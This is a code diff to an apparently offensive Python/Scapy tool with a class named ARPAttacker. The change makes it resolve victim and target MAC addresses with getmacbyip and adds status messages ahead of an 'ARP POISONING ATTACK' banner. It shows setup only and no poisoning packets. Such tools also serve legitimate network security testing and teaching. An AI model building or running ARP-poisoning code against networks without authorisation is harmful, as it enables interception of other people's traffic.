@@ -34,7 +34,7 @@ except ImportError:
     print("ERROR: Scapy not installed. Run: pip install scapy")
     sys.exit(1)
 
-from core.network_utils import get_interface_info, get_mac_address
+from core.network_utils import get_interface_info
 
 
 class ARPAttacker:
@@ -55,15 +55,17 @@ class ARPAttacker:
         self.our_mac = info.mac
         self.our_ip = info.ip
         
-        # Get victim's real MAC
-        self.victim_mac = get_mac_address(victim_ip, interface)
+        # Get victim's real MAC using ARP
+        print(f"Resolving MAC for victim {victim_ip}...")
+        self.victim_mac = getmacbyip(victim_ip)
         if not self.victim_mac:
-            raise ValueError(f"Cannot resolve MAC for victim {victim_ip}")
+            raise ValueError(f"Cannot resolve MAC for victim {victim_ip}. Is it online?")
             
-        # Get target's real MAC
-        self.target_mac = get_mac_address(target_ip, interface)
+        # Get target's real MAC using ARP
+        print(f"Resolving MAC for target {target_ip}...")
+        self.target_mac = getmacbyip(target_ip)
         if not self.target_mac:
-            raise ValueError(f"Cannot resolve MAC for target {target_ip}")
+            raise ValueError(f"Cannot resolve MAC for target {target_ip}. Is it online?")
             
         print(f"\n{'='*60}")
         print(f"  ARP POISONING ATTACK")
